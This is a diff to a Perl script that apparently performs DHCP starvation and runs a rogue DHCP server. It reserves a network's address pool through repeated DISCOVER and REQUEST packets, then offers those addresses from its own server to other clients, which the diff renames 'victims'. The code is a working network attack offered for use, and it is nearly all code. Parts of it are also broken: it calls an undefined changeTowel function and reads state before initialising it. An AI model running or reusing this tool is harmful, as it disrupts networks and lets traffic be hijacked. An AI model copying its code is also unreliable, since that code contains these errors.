@@ -12,31 +12,34 @@ my $n_towels = $ARGV[0] // 10;
 
 my %towel;
 
-# towels will be assigned to clients
-my %client;
-
-my $listener = IO::Socket::INET->new(
-	LocalPort => 68,
-	Proto => "udp",
-	Broadcast => 1,
-) or die "listener: $!";
+# towels will be assigned to victims
+my %victim;
 
 my $server = IO::Socket::INET->new(
-	LocalPort => 67,
-	Proto => "udp",
-	Broadcast => 1,
-) or die "server: $!";
-
-my $handle = IO::Socket::INET->new(
+	LocalPort => 'bootps',
 	Proto => 'udp',
 	Broadcast => 1,
-	PeerPort => '67',
-	LocalPort => '0',
-	#PeerAddr => inet_ntoa(INADDR_BROADCAST),
-	PeerAddr => '188.40.206.113',
-) or die "socket: $@";     # yes, it uses $@ here
+) or die "server socket: $!";
 
-my $select = new IO::Select($listener, $server) or die "IO::Select: $!";
+my $client = IO::Socket::INET->new(
+	Proto => 'udp',
+	Broadcast => 1,
+	LocalPort => 'bootpc',
+) or die "client socket: $!";
+
+my $BRDCAST_TO_SERVER = sockaddr_in(67, inet_aton('255.255.255.255'));
+my $BRDCAST_TO_CLIENT = sockaddr_in(68, inet_aton('255.255.255.255'));
+
+my $select = new IO::Select($client, $server) or die "IO::Select: $!";
+
+sub changeTowelState {
+	my ($xid, $state) = @_;
+	my $old = $towel{$xid}{state};
+	$towel{$xid}{state} = $state;
+	unless ($old eq $state) {
+		printTowelStatus();
+	}
+}
 
 sub sendDiscover {
 	my ($xid, $hw) = @_;
@@ -50,9 +53,10 @@ sub sendDiscover {
 		Chaddr => $hw,
 		DHO_DHCP_MESSAGE_TYPE() => DHCPDISCOVER()
 	);
+	changeTowelState($xid, "DISCOVER");
 	$towel{$xid} = { state => "DISCOVER", packet => $discover };
 	# send packet
-	$handle->send($discover->serialize())
+	$client->send($discover->serialize(), undef, $BRDCAST_TO_SERVER)
 	       or die "Error sending DHCPDISCOVER: $!\n";
 }
 
@@ -68,14 +72,14 @@ sub sendRequest {
 		DHO_DHCP_REQUESTED_ADDRESS() => $offer->yiaddr(),
 	);
 	# send packet
-	$handle->send($req->serialize())
+	$client->send($req->serialize(), undef, $BRDCAST_TO_SERVER)
 	       or die "Error sending DHCPREQUEST: $!\n";
 }
 
 sub findFreeTowel {
 	for my $xid (keys %towel) {
 		next unless $towel{$xid}{state} eq "ACK";
-		next if grep {$_ eq $xid} values %client;
+		next if grep {$_ eq $xid} values %victim;
 		return $xid;
 	}
 	return undef;
@@ -99,8 +103,8 @@ sub offerTowel {
 		Chaddr => $packet->chaddr(),
 		DHO_DHCP_MESSAGE_TYPE() => DHCPOFFER(),
 	);
-	$server->send($offer->serialize());
-	$client{$packet->xid()} = $towel_id;
+	$server->send($offer->serialize(), undef, $BRDCAST_TO_CLIENT);
+	$victim{$packet->xid()} = $towel_id;
 	print "-> DHCPOFFER", $packet->xid, "(towel", $towel_id, ")\n";
 }
 
@@ -111,10 +115,11 @@ sub readResponse {
 	my $packet = Net::DHCP::Packet->new($msg);
 	my $xid = $packet->xid;
 	## Responses to our communication
-	if ($towel{$xid}) {
+	if ($towel{$xid} && $handle == $client) {
 		if ($packet->op == BOOTREPLY() && $packet->getOptionValue(DHO_DHCP_MESSAGE_TYPE()) == DHCPOFFER()) {
-			print "<- DHCPOFFER $xid\n";
+			print "<- DHCPOFFER $xid ",(hex($xid)),"\n";
 			$towel{$xid} = { state => "OFFER", packet => $packet };
+			changeTowel($xid, "OFFER");
 			sendRequest($packet);
 		} elsif ($packet->op == BOOTREPLY() && $packet->getOptionValue(DHO_DHCP_MESSAGE_TYPE()) == DHCPNAK()) {
 			print "<- DHCPNAK $xid: ".($packet->getOptionValue(DHO_DHCP_MESSAGE()))."\n";
@@ -122,11 +127,12 @@ sub readResponse {
 		} elsif ($packet->op == BOOTREPLY() && $packet->getOptionValue(DHO_DHCP_MESSAGE_TYPE()) == DHCPACK()) {
 			print "<- DHCPACK $xid\n";
 			$towel{$xid} = { state => "ACK", packet => $packet };
+			changeTowel($xid, "ACK");
 			print "Reserved ".(countTowels("ACK"))." addresses from the pool.\n";
 		} else {
 			print $packet->toString();
 		}
-	} else {
+	} elsif ($handle == $server && !$towel{$xid}) {
 		## Requests from other clients ##
 		if ($packet->op == BOOTREQUEST() && $packet->getOptionValue(DHO_DHCP_MESSAGE_TYPE()) == DHCPDISCOVER()) {
 			print "<- DHCPDISCOVER $xid\n";
@@ -165,13 +171,19 @@ for (1..$n_towels) {
 	addTowel();
 }
 
+sub printTowelStatus {
+	print (join " ", map { "$_: ".countTowels($_) } ("DISCOVER", "OFFER", "ACK"));
+	print "\n";
+}
+
 while (1) {
 	refreshTowels();
 	while (my @h = $select->can_read(1)) {
 		readResponse($_) for @h;
 	}
-	print "Reserved ".(countTowels("ACK"))." addresses from the pool.\n";
 	while (countTowels()<$n_towels) {
 		addTowel();
 	}
+	printTowelStatus();
+	sleep 2;
 }
